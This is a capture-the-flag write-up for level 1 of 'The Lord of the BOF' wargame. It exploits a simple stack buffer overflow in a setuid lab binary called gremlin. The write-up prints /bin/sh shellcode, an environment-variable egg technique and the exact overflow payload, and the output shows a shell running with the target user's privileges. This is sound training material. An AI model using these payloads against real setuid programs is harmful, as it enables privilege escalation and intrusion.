# Level1

## This level's goal
- LEVEL1 (gate -> gremlin) : Simple BOF

***

```
[gate@localhost gate]$ bash2

[gate@localhost gate]$ ls -l
-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
-rw-rw-r--    1 gate     gate          272 Mar 29  2010 gremlin.c

[gate@localhost gate]$ cat gremlin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - gremlin
        - simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}

[gate@localhost gate]$ ./gremlin
argv error

[gate@localhost gate]$ ./gremlin AAAA
AAAA
```

In the code, the gremlin seems that it prints buffer(256bytes) which is your input.

```
(gdb) run
Starting program: /home/gate/gremlin
/bin/bash: /home/gate/gremlin: Operation not permitted
```

You cannot debug germlin cuz of the privilege, so you need to copy that for debug.

```
[gate@localhost gate]$ cp gremlin gremlin2
[gate@localhost gate]$ gdb -q gremlin2
(gdb) set disass intel
(gdb) disass main
0x8048433 <main+3>:     sub    %esp,0x100
0x804846e <main+62>:    lea    %eax,[%ebp-256]
```

The buffer is 256 without dummy, so the memory seems 256bytes + SFP(4byts) + RET(4bytes).

The point is that you need to overflow buf and SFP (260bytes) and then exploit RET with the shell code.

The shell code is   
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80`

```
[gate@localhost gate]$ export EGG=`python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[gate@localhost gate]$ echo 'int main() { printf("EGG -> 0x%x\n", getenv("EGG")); } ' > getegg.c
[gate@localhost gate]$ gcc getegg.c -o getegg
[gate@localhost gate]$ ./getegg
EGG -> 0xbffffeb1
```

Then the payload will be the dummy strings + the shell code's address.

```
[gate@localhost gate]$ ./gremlin `python -c 'print "A"*260+"\xb1\xfe\xff\xbf"'`
bash$ id
uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
bash$ my-pass
euid = 501
hello bof world
```




